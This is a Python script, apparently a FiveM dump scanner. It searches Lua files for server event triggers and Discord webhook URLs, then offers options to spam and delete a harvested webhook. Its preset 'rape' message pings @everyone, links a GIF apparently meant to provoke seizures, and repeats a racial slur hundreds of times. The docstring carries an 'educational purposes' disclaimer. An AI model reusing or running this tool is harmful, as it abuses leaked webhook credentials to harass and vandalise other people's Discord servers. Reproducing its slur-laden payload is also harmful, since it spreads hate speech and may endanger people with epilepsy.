"""

████████╗██████╗░██╗░██████╗░░██████╗░███████╗██████╗░  ███████╗██╗███╗░░██╗██████╗░███████╗██████╗░
╚══██╔══╝██╔══██╗██║██╔════╝░██╔════╝░██╔════╝██╔══██╗  ██╔════╝██║████╗░██║██╔══██╗██╔════╝██╔══██╗
░░░██║░░░██████╔╝██║██║░░██╗░██║░░██╗░█████╗░░██████╔╝  █████╗░░██║██╔██╗██║██║░░██║█████╗░░██████╔╝
░░░██║░░░██╔══██╗██║██║░░╚██╗██║░░╚██╗██╔══╝░░██╔══██╗  ██╔══╝░░██║██║╚████║██║░░██║██╔══╝░░██╔══██╗
░░░██║░░░██║░░██║██║╚██████╔╝╚██████╔╝███████╗██║░░██║  ██║░░░░░██║██║░╚███║██████╔╝███████╗██║░░██║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░╚═════╝░░╚═════╝░╚══════╝╚═╝░░╚═╝  ╚═╝░░░░░╚═╝╚═╝░░╚══╝╚═════╝░╚══════╝╚═╝░░╚═╝

This is a tool developed specific to scan FiveM dumps through

The script aim towards finding the needs of certain triggers, webhooks or other usefull information. 
The script has several functionalities, including but not limited to removing the webhook and as far as to completely rape it as well.

This tool is made for educational purposes. Any misuse of this is not my responsibility. "You do the crime, you do the time"
"""

import os
import re
import requests
import time

from pathlib import Path
from colorama import Fore

os.system("cls && title FiveM Finder")

class Find:
    def __init__(self):
        self.processed_files = set()

    def search(self, directory, searchword):
        done_files = set()
        crash_files = set()
        webhook = []
        failed = 0
        path = Path(directory)

        search_string = searchword

        for file in path.rglob('*.lua'):
            if file.is_file() and file not in done_files and file not in crash_files:
                try:
                    done_files.add(file)
                    text = file.read_text()
                    if search_string in text:
                        print(f"{Fore.RED}[File] {Fore.RESET}{Fore.GREEN}{file}{Fore.RESET}")
                        with open(file, encoding="utf-8") as f:
                            for line in f:
                                if search_string in line:
                                    stripped_line = line.strip()
                                    print(stripped_line)
                                    if "discord" in stripped_line:
                                        webhook.append(stripped_line)
                except:
                    crash_files.add(file)
                    failed += 1

        print("-------------------------------------------------------------------------------------------------------------------------")
        
        webhook_pattern = r"https://discord\.com/api/webhooks/[0-9]+/[A-Za-z0-9_-]+"

        for element in webhook:
            found_webhooks = re.findall(webhook_pattern, element)
            for webhook in found_webhooks:
                print(webhook)
        if webhook:
            print("https://ghaph.com/tools/webhookdeleter")

class Discord:
    @staticmethod
    def discord_spam(webhook, message, times):
        messageID = 0
        headers = {'Content-Type': 'application/json'}
        payload = {'content': message}
        for _ in range(times):
            response = requests.post(webhook, headers=headers, json=payload)
            if response.status_code == 204:
                messageID += 1
                print(f"{Fore.GREEN}[!]{Fore.RESET} Successfully sent a message! Message: {messageID}")
            elif response.status_code == 429:
                print(f"{Fore.YELLOW}[!]{Fore.RESET} Ratelimit Detected! Waiting")
                time.sleep(0.7)
            else:
                print(f"{Fore.RED}[!]{Fore.RESET} Failed to send a message! Status code: {response.status_code}")
            time.sleep(0.5)
   
    def discord_delete(webhook):
        a = requests.delete(webhook)
        time.sleep(2)
        if a.status_code == 204:
            print(f"{Fore.GREEN}[!]{Fore.RESET} Deleted Webhook --> {webhook}")
        else:
            print(f"{Fore.RED}[!]{Fore.RESET} Failed to delete webhook --> {webhook}")

def main():
    print(f"""{Fore.YELLOW}
   _____ __       _                _______           __
  / ___// /______(_)___  ____ _   / ____(_)___  ____/ /__  _____
  \__ \/ __/ ___/ / __ \/ __ `/  / /_  / / __ \/ __  / _ \/ ___/
 ___/ / /_/ /  / / / / / /_/ /  / __/ / / / / / /_/ /  __/ /
/____/\__/_/  /_/_/ /_/\__, /  /_/   /_/_/ /_/\__,_/\___/_/ 
                      /____/
{Fore.RESET}
Triggers    [Searches for Triggers]
Webhook     [Searches for Webhooks]
Tools:
Spam        [Spams a Discord Webhook]
Delete      [Deletes a Discord Webhook]

------------------------------------------------
    """)

    choice = input(f"{Fore.RED}[?]{Fore.RESET}[Option] --> ")
    if choice.lower() not in ["5", "6", "spam", "delete"]:
        directory_to_search = input(f"{Fore.RED}[?]{Fore.RESET}[Directory] --> ")

    finder = Find()

    if choice.lower() in ['triggers', '1']:
        finder.search(directory_to_search, searchword="TriggerServerEvent")
    elif choice.lower() in ['webhook', '2']:
        finder.search(directory_to_search, searchword="https://discord.com/api/webhooks/")
    elif choice.lower() in ['spam', '3']:
        webhook = input(f"{Fore.RED}[?]{Fore.RESET}[Webhook] --> ")
        message = input(f"{Fore.RED}[?]{Fore.RESET}[Message, rape for rape message] --> ")
        if message.lower() == "rape":
            message = "@everyone get fucked https://tenor.com/view/epilepsi-patates-pattes-denemepattes-gif-13248094 https://cdn.discordapp.com/attachments/445087746835480587/523274742539747331/geico.gif?comment=NiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNiggerNigger. @everyone Get Fucked @everyone Get Fucked @everyone"
        times = int(input(f"{Fore.RED}[?]{Fore.RESET}[Amount] --> "))
        Discord.discord_spam(webhook, message, times)
    elif choice.lower() in ['delete', '4']:
        webhook = input(f"{Fore.RED}[?]{Fore.RESET}[Webhook] --> ")
        Discord.discord_delete(webhook)
if __name__ == '__main__':
    main()

